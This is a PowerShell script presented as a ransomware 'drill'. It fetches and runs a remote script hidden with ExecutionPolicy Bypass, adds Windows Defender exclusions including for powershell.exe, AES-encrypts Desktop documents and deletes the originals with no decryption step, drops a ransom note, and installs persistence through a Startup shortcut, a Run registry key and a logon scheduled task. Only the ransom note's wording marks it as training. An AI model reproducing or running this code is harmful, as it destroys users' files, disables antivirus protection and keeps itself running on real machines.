# === CONFIGURATION ===

# URL to download your drill script (replace with your actual URL)
$scriptUrl = "http://your-server.com/path/to/ABC_en.ps1"

# TEMP path to save downloaded script
$tempScriptName = "ABC_en.ps1"
$tempScriptPath = "$env:TEMP\$tempScriptName"

# Target folder to encrypt (Default Desktop)
$targetFolder = [Environment]::GetFolderPath('Desktop')

# File extensions to encrypt (lowercase)
$targetExtensions = @(".pdf", ".txt", ".xls", ".xlsx", ".csv", ".docx")

# Ransom note path
$ransomNotePath = "$targetFolder\README_LAB.txt"

# Log file path
$logPath = "$env:APPDATA\drill_log.txt"

# Encryption key (32 bytes for AES-256) — keep secret and consistent
$keyString = "ThisIsA32ByteLongEncryptionKey1234"
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($keyString)

# Extension for encrypted files
$encExt = ".locked"

# === ADDITIONAL EXCLUSIONS ===

# Base exclusions for browser data folders
$additionalExcludePaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data",
    "$env:APPDATA\Mozilla\Firefox\Profiles"
)

# Browser download folders (exclude to allow auto-download)
$browserDownloadFolders = @(
    "$env:USERPROFILE\Downloads",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Downloads",
    "$env:APPDATA\Mozilla\Firefox\Profiles",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Downloads"
)

$additionalExcludePaths += $browserDownloadFolders

# Specific files to exclude (full paths or wildcards)
$additionalExcludeFiles = @(
    # e.g. "$targetFolder\ImportantFile.txt"
)

# === FUNCTIONS ===

function Add-DefenderExclusions {
    # Exclude folders
    $foldersToExclude = @($targetFolder, $env:TEMP) + $additionalExcludePaths
    foreach ($folder in $foldersToExclude) {
        if (Test-Path $folder) {
            Write-Output "Adding Defender exclusion for folder: $folder"
            Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
        }
    }
    # Exclude specific files
    foreach ($file in $additionalExcludeFiles) {
        if (Test-Path $file) {
            Write-Output "Adding Defender exclusion for file: $file"
            Add-MpPreference -ExclusionProcess $file -ErrorAction SilentlyContinue
        }
    }
    # Exclude PowerShell process
    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
}

function Encrypt-File {
    param (
        [string]$inputFile,
        [byte[]]$key
    )
    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

        $aes.GenerateIV()
        $iv = $aes.IV

        $encryptor = $aes.CreateEncryptor()

        $inputBytes = [System.IO.File]::ReadAllBytes($inputFile)
        $encryptedBytes = $encryptor.TransformFinalBlock($inputBytes, 0, $inputBytes.Length)

        $outputBytes = New-Object byte[] ($iv.Length + $encryptedBytes.Length)
        [Array]::Copy($iv, 0, $outputBytes, 0, $iv.Length)
        [Array]::Copy($encryptedBytes, 0, $outputBytes, $iv.Length, $encryptedBytes.Length)

        $encryptedFile = "$inputFile$encExt"
        [System.IO.File]::WriteAllBytes($encryptedFile, $outputBytes)

        Remove-Item -Path $inputFile -Force

        Add-Content -Path $logPath -Value "Encrypted: $inputFile -> $encryptedFile"
    }
    catch {
        Add-Content -Path $logPath -Value "Failed to encrypt $inputFile : $_"
    }
}

function DownloadAndRunDrill {
    try {
        Write-Output "Downloading drill script from $scriptUrl to $tempScriptPath..."
        Invoke-WebRequest -Uri $scriptUrl -OutFile $tempScriptPath -ErrorAction Stop
        Write-Output "Download complete. Running drill script from TEMP folder..."
        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempScriptPath`"" -WindowStyle Hidden
        exit
    }
    catch {
        Write-Error "Failed to download or run the drill script: $_"
        exit 1
    }
}

# === MAIN SCRIPT ===

# If script is NOT running from TEMP, download and run from TEMP
if ($MyInvocation.MyCommand.Path -ne $tempScriptPath) {
    DownloadAndRunDrill
}

# Add Defender exclusions
Add-DefenderExclusions

# Create target folder if missing
if (-not (Test-Path $targetFolder)) {
    New-Item -ItemType Directory -Path $targetFolder -Force | Out-Null
}

# Encrypt targeted files recursively
Get-ChildItem -Path $targetFolder -File -Recurse | Where-Object {
    $targetExtensions -contains $_.Extension.ToLower()
} | ForEach-Object {
    Encrypt-File -inputFile $_.FullName -key $keyBytes
}

# Create ransom note on desktop
$ransomText = @"
All your important files have been encrypted in this drill.

This is a cybersecurity training exercise. No real damage done.

Contact your internal security team for recovery instructions.
"@
Set-Content -Path $ransomNotePath -Value $ransomText

# Setup persistence

$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$persistCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempScriptPath`""

# Create shortcut in Startup folder
$WshShell = New-Object -ComObject WScript.Shell
$shortcutPath = "$startupFolder\DrillSim.lnk"
$shortcut = $WshShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempScriptPath`""
$shortcut.Save()

# Add registry Run key
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "DrillSim" -Value $persistCommand

# Register scheduled task
$taskName = "DrillSimTask"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempScriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn

try {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
} catch {}

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -User "$env:USERNAME"

# End of script
